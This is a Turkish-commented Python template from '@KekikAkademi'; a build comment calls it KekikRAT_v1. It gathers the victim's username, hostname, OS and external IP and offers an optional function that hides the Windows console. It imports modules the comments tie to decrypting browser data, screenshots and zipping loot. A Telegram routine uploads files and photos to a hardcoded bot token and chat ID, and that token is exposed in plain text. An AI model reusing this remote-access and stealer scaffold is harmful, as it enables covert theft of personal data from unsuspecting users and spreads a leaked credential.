#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

########################################################################################################################
import os                       # Dizinler ve dosyalarla çalışmak için
import platform                 # Çalışılan makine bilgisi sağlayacak arkadaş
import time,datetime,pytz       # Zaman/Tarih Bilgisi sağlayacak arkadaşlar
import ctypes                   # C dili veri tipleri kullanmamızı sağlayacak arkadaş (.DLL / .SO)
import colorama                 # Ortalığın renklenmesini sağlayacak arkadaş
from colorama import Fore       # Boyamayı kolaylaştıran arkadaş (BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE)
colorama.init(autoreset=True)        # Renklerin ilgili satırdan başka satıra devam etmemesi için
######################################
import requests                 # Websitelerine istek atmamızı sağlayacak arkadaş
from bs4 import BeautifulSoup   # HTML veya XML dosyalarını işleyen arkadaş
#################################
import webbrowser           # Tarayıcıda bağlantı açtırmak için
import subprocess           # Kill Process(İşlem Sonlandırma) Kullanmak için
import shutil               # Tarayıcı verilerini kopyalamak için
import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için
from PIL import ImageGrab   # Ekran görüntüsü almak için
import zipfile              # Topladığımız verileri Zip'lemek için
#############################
import telebot    # pyTelegramBotAPI
########################################################################################################################

########################################################################################################################
## GenelDegiskenler
kullanici_adi = os.getlogin()                                                   # Kullanıcı Adı
bilgisayar_adi = platform.node()                                                # Bilgisayar Adı
oturum = kullanici_adi + "@" + bilgisayar_adi                                   # Örn.: "kekik@Administrator"

isletim_sistemi = platform.system()                                             # İşletim Sistemi
bellenim_surumu = platform.release()                                            # Sistem Bellenim Sürümü
cihaz = isletim_sistemi + " | " + bellenim_surumu                               # Örn.: "Windows | 10"

tarih = datetime.datetime.now(pytz.timezone("Turkey")).strftime("%d-%m-%Y")     # Bugünün Tarihi
saat = datetime.datetime.now(pytz.timezone("Turkey")).strftime("%H:%M")         # Bugünün Saati
zaman = tarih + " | " + saat

ip_req = requests.get('http://ip.42.pl/raw')    # Harici IP'yi bulmak için bir GET isteği yolluyoruz
ip = ip_req.text                                # ip Adresi
########################################################################################################################

########################################################################################################################
def Temizle():                          # Temizle adında bir fonksiyon oluşturduk
    if isletim_sistemi == "Windows":    # Eğer İşletim Sistemi "Windows" ise
        os.system("cls")                # Sisteme "cls" komutu gönder
    else:                               # Sistem Windows değil ise
        os.system("clear")              # Sisteme "clear" komutu gönder
Temizle()                               # Temizle fonksiyonumuzu çağırdık
########################################################################################################################

########################################################################################################################
def WindowsTerminaliGizle():                        # WindowsTerminaliGizle adında bir fonksiyon oluşturduk
    if isletim_sistemi == "Windows":                # Eğer İşletim Sistemi "Windows" ise
        import win32console, win32gui               # Gerekli Modüller
        terminal = win32console.GetConsoleWindow()  # Terminal adlı değişken
        win32gui.ShowWindow(terminal, 0)            # Görünmez yap
    else:                                           # Eğer İşletim Sistemi "Windows" değilse
        pass                                        # Boşver :)
#WindowsTerminaliGizle() # Eğer Windows'da Terminalin gizlenmesini istiyosanız aktifleştirin
                         # -- pyinstaller --onefile KekikRAT_v1.py --
########################################################################################################################

########################################################################################################################
def PencereBasligi():                                                               # PencereBasligi fonksiyonu
    if isletim_sistemi == "Windows":                                                # Eğer İşletim Sistemi "Windows" ise
        ctypes.windll.kernel32.SetConsoleTitleW("@KekikAkademi Kopya Kağıdı")       # Konsol Başlığını ayarla
    elif isletim_sistemi == "Android":                                              # Eğer İşletim Sistemi "Android" ise
        os.system("clear")                                                          # Sisteme "clear" komutu gönder
    else:                                                                           # Hiçbiri değil ise
        os.system('title @KekikAkademi Kopya Kağıdı')                               # Başlık Ayarla
PencereBasligi()                                                                    # PencereBasligi çağır
########################################################################################################################

########################################################################################################################
def WindowsBildirimi(): # WindowsBildirimi adında bir metod oluşturduk
    if isletim_sistemi == "Windows":
        from win10toast import ToastNotifier         # Windows'a bildirim göndermek için
        bildirim = ToastNotifier()
        bildirim.show_toast("Bildirim Gibi Bildirim", "Kopya Kağıdı", icon_path=None, duration=10, threaded=True)
    else:
        pass
WindowsBildirimi()
########################################################################################################################

########################################################################################################################
def TelegramBot():
    ####################################################################################################################
    tg_bot_token = "921015578:AAERTtQ-LxeG6huZZw-dbmW1LQjJv9yZK4Q" # Bot Token
    tg_chat_id = "717569643"                                       # Chat ID

    tg_bot_adi = telebot.TeleBot(tg_bot_token)  # telebot'a Tokenimizi bağladık
    ####################################################################################################################
    def TelegramBotTest():
        ##############################
        ### Eski Usul requests Metodu;
        ## requests ile Mesaj Gönderme --- https://core.telegram.org/bots/api
        mesaj = "Merhaba, Beni requests Gönderdi!"
        requests.post("https://api.telegram.org/bot" + tg_bot_token + "/sendMessage?chat_id=" + tg_chat_id + "&text=" + mesaj)
        # https://api.telegram.org/bot921015578:AAERTtQ-LxeG6huZZw-dbmW1LQjJv9yZK4Q/sendMessage?chat_id=717569643&text=Merhaba, Beni requests Gönderdi!

        ## requests ile Dosya Gönderme
        dosya = open(r"DocTest_KekikAkademi.txt", 'rb') # veya "C:\Users\kekik\Desktop\kodlama\DocTest_KekikAkademi.txt"
        files_for_link = {'document': dosya}
        requests.post("https://api.telegram.org/bot" + tg_bot_token + "/sendDocument?chat_id=" + tg_chat_id , files=files_for_link)

        ## requests ile Resim Gönderme
        # (Eğer Fotoğrafta Çözünürlük Kaybı Yaşanmasını İstemiyorsanız Dosya Olarak Gönderin.)
        resim = open(r"FotoTest_KekikAkademi.png", 'rb') # veya "C:\Users\kekik\Desktop\kodlama\FotoTest_KekikAkademi.png"
        img_for_link = {'photo': resim}
        requests.post("https://api.telegram.org/bot" + tg_bot_token + "/sendPhoto?chat_id=" + tg_chat_id , files=img_for_link)
        ##############################
        ##############################
        ### Yeni Nesil TeleBot Metodu;
        # TeleBot ile Mesaj Gönderme --- https://github.com/eternnoir/pyTelegramBotAPI#telebot
        mesaj = "Merhaba, Beni TeleBot Gönderdi!"
        tg_bot_adi.send_message(tg_chat_id, mesaj)

        # TeleBot ile Dosya Gönderme
        dosya = open(r"DocTest_KekikAkademi.txt", 'rb') # veya "C:\Users\kekik\Desktop\kodlama\DocTest_KekikAkademi.txt"
        tg_bot_adi.send_document(tg_chat_id, dosya)

        # TeleBot ile Resim Gönderme
        # (Eğer Fotoğrafta Çözünürlük Kaybı Yaşanmasını İstemiyorsanız Dosya Olarak Gönderin.)
        resim = open(r"FotoTest_KekikAkademi.png", 'rb') # veya "C:\Users\kekik\Desktop\kodlama\FotoTest_KekikAkademi.png"
        tg_bot_adi.send_photo(tg_chat_id, resim)
        ##############################
    TelegramBotTest()
#TelegramBot()
########################################################################################################################

########################################################################################################################
def AcilisSayfasi(): # pankart = http://patorjk.com/software/taag/#p=display&f=Doom&t=kopya%20Kagidi
    pankart = '''
 _                             _   __            _     _ _ 
| |                           | | / /           (_)   | (_)
| | _____  _ __  _   _  __ _  | |/ /  __ _  __ _ _  __| |_ 
| |/ / _ \| '_ \| | | |/ _` | |    \ / _` |/ _` | |/ _` | |
|   < (_) | |_) | |_| | (_| | | |\  \ (_| | (_| | | (_| | |
|_|\_\___/| .__/ \__, |\__,_| \_| \_/\__,_|\__, |_|\__,_|_|
          | |     __/ |                     __/ |          
          |_|    |___/                     |___/           
'''
    print(Fore.GREEN + pankart)
    print(Fore.LIGHTBLACK_EX + f"\t{kullanici_adi} | {cihaz} | " + Fore.LIGHTGREEN_EX + f"{ip}" +
          Fore.YELLOW + f"\n\t\t{zaman}\n")
    print(Fore.CYAN + '\t[1] SeçenekBİR\n\t[2] SeçenekİKİ\n\t[3] SeçenekÜÇ\n')

    secenek = str(input(Fore.RED + f"{oturum}" + Fore.LIGHTBLUE_EX + " >> " + Fore.GREEN))
    #########################
    if secenek == '1':
        Temizle()
        print("SeçenekBİR")
AcilisSayfasi()
########################################################################################################################